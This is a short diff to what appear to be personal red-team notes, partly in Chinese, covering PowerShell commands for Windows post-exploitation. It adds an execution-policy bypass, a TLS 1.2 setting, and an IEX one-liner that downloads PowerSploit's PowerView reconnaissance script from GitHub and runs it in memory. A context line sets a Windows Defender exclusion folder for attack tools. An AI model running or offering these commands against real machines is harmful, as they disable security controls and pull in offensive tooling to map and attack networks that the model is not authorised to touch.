@@ -1,3 +1,11 @@
+>>> Set-ExecutionPolicy
+  Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+>>> 更新為powershell下載時用TLS1.2:
+  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+>>> PowerView:
+    IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
+
+
 把某一個資料夾set成"defender不自動刪除地帶"
 	Add-MpPreference -ExclusionPath "C:\Tools"
 下載PowerView:
